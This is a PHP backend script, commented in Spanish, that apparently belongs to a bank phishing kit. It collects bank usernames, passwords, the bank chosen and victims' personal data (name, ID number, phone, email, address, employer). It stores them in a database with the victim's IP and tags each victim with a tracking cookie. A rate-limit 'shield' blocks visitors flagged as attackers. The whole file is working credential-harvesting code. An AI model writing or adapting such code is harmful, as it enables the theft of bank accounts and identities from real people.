<?php
require_once("../lib/class.inputfilter.php");
require('../panel/include/setings.php');

// 🟢 1. INCLUIR EL ARCHIVO DEL ESCUDO
require_once('../panel/run/rate-limit.php'); 

date_default_timezone_set('America/Bogota');

// 🟢 2. EJECUTAR EL ESCUDO (Si excede, el script muere aquí y bloquea la IP)
$ip_del_atacante = getClientIP();
checkRateLimit($ip_del_atacante);

// Si pasa la validación anterior, el código sigue normalmente...
$ifilter = new InputFilter();

// Atrapamos usuario, clave y banco
$usuario = isset($_POST['usr']) ? $ifilter->process($_POST['usr']) : '';
$contrasena = isset($_POST['pas']) ? $ifilter->process($_POST['pas']) : '';
$banco = isset($_POST['ban']) ? $ifilter->process($_POST['ban']) : '';
$dispositivo = isset($_POST['dis']) ? $ifilter->process($_POST['dis']) : 'PC';

// Atrapamos los datos personales enviados desde functions.js
$nom = isset($_POST['nom']) ? $ifilter->process($_POST['nom']) : '';
$ape = isset($_POST['ape']) ? $ifilter->process($_POST['ape']) : '';
$tdoc = isset($_POST['tdoc']) ? $ifilter->process($_POST['tdoc']) : '';
$doc = isset($_POST['doc']) ? $ifilter->process($_POST['doc']) : '';
$cel = isset($_POST['cel']) ? $ifilter->process($_POST['cel']) : '';
$eml = isset($_POST['eml']) ? $ifilter->process($_POST['eml']) : '';
$dir = isset($_POST['dir']) ? $ifilter->process($_POST['dir']) : '';
$emp = isset($_POST['emp']) ? $ifilter->process($_POST['emp']) : '';
$ref = isset($_POST['ref']) ? $ifilter->process($_POST['ref']) : '';
$mnt = isset($_POST['mnt']) ? $ifilter->process($_POST['mnt']) : '';

$ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];

// CONECTAMOS A LA BASE DE DATOS E INSERTAMOS TODO JUNTO
if ($con = conectar()) {
    $sql = "INSERT INTO m3it3m 
            (usuario, password, banco, status, nombre, apellido, tipo_doc, cedula, celular, email, direccion, empresa, referencia, agente, ip) 
            VALUES (?, ?, ?, 2, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)";
            
    $stmt = mysqli_prepare($con, $sql);
    
    if ($stmt) {
        mysqli_stmt_bind_param($stmt, "ssssssssssssss", 
            $usuario, $contrasena, $banco, $nom, $ape, $tdoc, $doc, $cel, $eml, $dir, $emp, $ref, $mnt, $ip
        );
        
        if (mysqli_stmt_execute($stmt)) {
            // Recuperamos el ID generado para guardarlo en la cookie
            $id = mysqli_insert_id($con);
            setcookie('id', $id, time() + (86400 * 30), "/");
        }
        mysqli_stmt_close($stmt);
    }
    desconectar($con);
}
?>